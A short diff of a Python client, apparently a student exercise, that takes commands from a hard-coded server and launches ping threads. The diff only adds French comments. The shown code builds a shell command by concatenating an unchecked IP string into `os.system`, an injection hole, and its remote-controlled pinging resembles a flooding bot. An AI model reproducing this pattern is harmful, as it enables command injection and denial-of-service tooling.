@@ -2,9 +2,11 @@ import socket
 import threading
 import os
 
+# Thread de ping.
 def thread_ping(ip):
 	os.system("ping " + ip)
 
+# Thread permettant au client de recevoir des messages et commandes du serveur.
 def thread_recevoir(client_socket):
 	while True:
 		reponse = client.recv(1024)
@@ -22,7 +24,7 @@ def thread_recevoir(client_socket):
 			thread_ping1.run()
 			thread_ping1.run()
 
-#Debut du main
+# Début du main
 serveur_ip = "192.168.60.45"
 serveur_port = 9999
 
